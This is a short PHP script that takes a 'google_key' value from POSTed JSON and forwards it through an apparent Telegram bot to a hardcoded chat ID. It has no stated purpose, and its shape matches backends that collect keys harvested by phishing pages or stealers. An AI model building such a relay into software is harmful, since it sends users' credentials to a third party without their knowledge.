<?php

include "sendmail.php";
require_once "vendor/autoload.php";

if(isset($_POST)){
    $data = json_decode(file_get_contents('php://input'));

    $text = "Google key - ". $data->google_key;
    $bot->sendMEssage(450790032, $text);
}